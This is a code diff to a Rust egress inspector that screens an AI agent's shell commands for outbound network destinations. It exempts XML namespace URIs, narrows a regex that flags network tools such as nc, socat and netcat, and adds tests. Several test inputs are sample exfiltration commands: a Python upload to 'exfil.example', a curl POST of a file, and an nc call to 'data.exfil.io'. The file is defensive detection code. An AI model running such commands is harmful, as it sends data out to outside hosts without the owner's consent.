@@ -48,8 +48,12 @@ fn extract_destinations(command: &str) -> Vec<EgressDestination> {
     let mut destinations = Vec::new();
 
     static URL_RE: OnceLock<Regex> = OnceLock::new();
-    let url_re = URL_RE.get_or_init(|| Regex::new(r#"(?i)(https?|ftp)://[^\s'"<>|;&)]+"#).unwrap());
+    let url_re =
+        URL_RE.get_or_init(|| Regex::new(r#"(?i)(https?|ftp)://[^\s'"<>|;&)}]+"#).unwrap());
     for cap in url_re.find_iter(command) {
+        if is_xml_namespace_identifier(command, cap.start(), cap.end()) {
+            continue;
+        }
         let url = cap.as_str().to_string();
         let domain = extract_domain_from_url(&url).unwrap_or_default();
         if !domain.is_empty() {
@@ -141,7 +145,7 @@ fn extract_destinations(command: &str) -> Vec<EgressDestination> {
     static GENERIC_NET_CMD_RE: OnceLock<Regex> = OnceLock::new();
     let generic_net_cmd_re = GENERIC_NET_CMD_RE.get_or_init(|| {
         Regex::new(
-            r"(?i)\b(fetch|nc|ncat|netcat|ftp|sftp|socat|httpie|xh)\b[^\n]*?\b((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,})\b"
+            r"(?im)(?:^|[;&|(`]\s*)\s*(?:(?:then|do|else)\s+)?(?:sudo\s+)?\b(fetch|nc|ncat|netcat|ftp|sftp|socat|httpie|xh)\b[^\n]*?\b((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,})\b"
         ).unwrap()
     });
     let already_seen: HashSet<String> = destinations
@@ -182,6 +186,52 @@ fn extract_destinations(command: &str) -> Vec<EgressDestination> {
     }
 
     destinations
+}
+
+fn is_xml_namespace_identifier(command: &str, url_start: usize, url_end: usize) -> bool {
+    let (Some(before_url), Some(after_url)) = (command.get(..url_start), command.get(url_end..))
+    else {
+        return false;
+    };
+
+    if before_url.ends_with('{') && after_url.starts_with('}') {
+        return true;
+    }
+
+    let is_quoted_value = matches!(before_url.chars().next_back(), Some('\'' | '"'))
+        && matches!(after_url.chars().next(), Some('\'' | '"'));
+    if !is_quoted_value {
+        return false;
+    }
+
+    let Some(mapping_start) = before_url.rfind('{') else {
+        return false;
+    };
+    let Some(mapping_body) = before_url.get(mapping_start + 1..) else {
+        return false;
+    };
+    if mapping_body.contains('}') || !after_url.contains('}') {
+        return false;
+    }
+
+    let Some(assignment) = before_url.get(..mapping_start) else {
+        return false;
+    };
+    let assignment = assignment.trim_end();
+    let Some(assignment) = assignment.strip_suffix('=') else {
+        return false;
+    };
+    let name = assignment
+        .trim_end()
+        .rsplit(|c: char| !c.is_ascii_alphanumeric() && c != '_')
+        .next()
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+
+    matches!(name.as_str(), "ns" | "namespace" | "namespaces")
+        || name.ends_with("_ns")
+        || name.ends_with("_namespace")
+        || name.ends_with("_namespaces")
 }
 
 fn extract_domain_from_url(url: &str) -> Option<String> {
@@ -481,6 +531,47 @@ mod tests {
     }
 
     #[test]
+    fn xml_namespace_identifiers_are_not_egress_destinations() {
+        let command = r#"python3 - <<'PY'
+import xml.etree.ElementTree as ET
+ns = {'a': 'http://www.w3.org/2005/Atom'}
+root = ET.parse('arxiv-results.xml').getroot()
+total = root.find('{http://a9.com/-/spec/opensearch/1.1/}totalResults')
+print(total.text)
+PY"#;
+
+        assert!(extract_destinations(command).is_empty());
+    }
+
+    #[test]
+    fn executable_post_to_namespace_uri_is_still_an_egress_destination() {
+        let destinations = extract_destinations(
+            "curl -X POST http://www.w3.org/2005/Atom --data-binary @payload.xml",
+        );
+
+        assert_eq!(destinations.len(), 1);
+        assert_eq!(destinations[0].domain, "www.w3.org");
+        assert_eq!(
+            detect_direction("curl -X POST http://www.w3.org/2005/Atom --data-binary @payload.xml"),
+            EgressDirection::Outbound
+        );
+    }
+
+    #[test]
+    fn xml_namespace_map_does_not_hide_an_adjacent_python_upload() {
+        let command = r#"python3 - <<'PY'
+import requests
+ns = {'a': 'http://www.w3.org/2005/Atom'}
+requests.post('https://exfil.example/upload', data=payload)
+PY"#;
+        let destinations = extract_destinations(command);
+
+        assert_eq!(destinations.len(), 1);
+        assert_eq!(destinations[0].domain, "exfil.example");
+        assert_eq!(detect_direction(command), EgressDirection::Outbound);
+    }
+
+    #[test]
     fn test_package_publish_detection() {
         // Should detect
         assert_eq!(extract_destinations("npm publish").len(), 1);
@@ -557,6 +648,21 @@ mod tests {
 
         let dests = extract_destinations("scp file.txt user@remote.example.com:/tmp/");
         assert!(!dests.iter().any(|d| d.kind == "generic_network"));
+
+        let dests = extract_destinations(
+            "# Sleep briefly then fetch abs pages as text via export.arxiv.org",
+        );
+        assert!(dests.is_empty());
+
+        let dests = extract_destinations("fetch export.arxiv.org");
+        assert!(dests
+            .iter()
+            .any(|d| { d.kind == "generic_network" && d.domain == "export.arxiv.org" }));
+
+        let dests = extract_destinations("if true; then nc data.exfil.io 9999; fi");
+        assert!(dests
+            .iter()
+            .any(|d| d.kind == "generic_network" && d.domain == "data.exfil.io"));
     }
 
     #[test]
@@ -679,6 +785,26 @@ mod tests {
 
         assert_eq!(results.len(), 1);
         assert_eq!(results[0].action, InspectionAction::Allow);
+    }
+
+    #[tokio::test]
+    async fn local_xml_parsing_does_not_request_egress_approval() {
+        let inspector = EgressInspector::new(test_permission_manager());
+        let tool_requests = vec![ToolRequest {
+            id: "req-xml".to_string(),
+            tool_call: Ok(CallToolRequestParams::new("shell").with_arguments(object!({
+                "command": "python3 - <<'PY'\nimport xml.etree.ElementTree as ET\nns = {'a': 'http://www.w3.org/2005/Atom'}\nroot = ET.parse('arxiv-results.xml').getroot()\ntotal = root.find('{http://a9.com/-/spec/opensearch/1.1/}totalResults')\nprint(total.text)\nPY"
+            }))),
+            metadata: None,
+            tool_meta: None,
+        }];
+
+        let results = inspector
+            .inspect("session", &tool_requests, &[], GoslingMode::Auto)
+            .await
+            .unwrap();
+
+        assert!(results.is_empty());
     }
 
     /// Auto must not silently exfiltrate. This previously asserted `Allow`,
